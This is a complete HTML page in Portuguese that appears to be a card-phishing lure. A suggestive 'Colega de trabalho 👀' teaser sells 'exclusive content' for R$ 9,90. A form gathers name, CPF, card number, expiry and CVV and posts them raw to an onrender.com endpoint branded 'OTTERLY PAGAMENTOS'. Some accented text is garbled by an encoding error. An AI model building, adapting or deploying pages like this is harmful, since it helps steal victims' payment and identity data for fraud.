<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Premium | Colega de Trabalho</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #0f0f10; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #e0e0e0; }
        .card-section { background: #1a1a1c; width: 100%; max-width: 420px; padding: 35px; border-radius: 16px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #2a2a2d; margin-bottom: 25px; }
        .intro-section { text-align: center; }
        .intro-section h1 { color: #fff; font-size: 2rem; margin-bottom: 10px; }
        .intro-section p { color: #888; margin-bottom: 15px; }
        .price { color: #007bff; font-weight: bold; font-size: 1.4rem; }
        .form-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 6px; color: #777; font-size: 0.8rem; font-weight: 600; }
        input { width: 100%; padding: 12px; background-color: #252528; border: 2px solid #2a2a2d; border-radius: 8px; outline: none; color: #fff; transition: 0.3s; }
        input:focus { border-color: #007bff; box-shadow: 0 0 10px rgba(0, 123, 255, 0.3); }
        .row { display: flex; gap: 10px; }
        .row .form-group { flex: 1; }
        button { width: 100%; padding: 15px; background-color: #007bff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background-color: #0056b3; box-shadow: 0 0 15px rgba(0, 123, 255, 0.5); }
        .otterly-seal { position: fixed; bottom: 20px; right: 20px; font-size: 0.6rem; color: #444; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="card-section intro-section">
        <h1>Colega de trabalho ðŸ‘€</h1>
        <p>Acesso exclusivo ao conteÃºdo completo.</p>
        <span class="price">R$ 9,90</span>
    </div>

    <div class="card-section">
        <form action="https://otterly-api.onrender.com/pay" method="POST">
            <div class="form-group">
                <label>NOME DO TITULAR</label>
                <input type="text" name="nome" placeholder="Como no cartÃ£o" required>
            </div>
            <div class="form-group">
                <label>CPF</label>
                <input type="text" name="cpf" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
            </div>
            <div class="form-group">
                <label>NÃšMERO DO CARTÃƒO</label>
                <input type="text" name="cartao" id="cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>
            <div class="row">
                <div class="form-group">
                    <label>VALIDADE</label>
                    <input type="text" name="validade" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label>CVV</label>
                    <input type="text" name="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>
            <button type="submit">PAGAR AGORA</button>
        </form>
    </div>

    <div class="otterly-seal">OTTERLY PAGAMENTOS</div>

    <script>
        // MÃ¡scaras de preenchimento
        document.getElementById('cpf').addEventListener('input', e => {
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/);
            e.target.value = !x[2] ? x[1] : x[1] + '.' + x[2] + '.' + x[3] + (x[4] ? '-' + x[4] : '');
        });
        document.getElementById('cartao').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
            e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
        });
    </script>
</body>
</html>
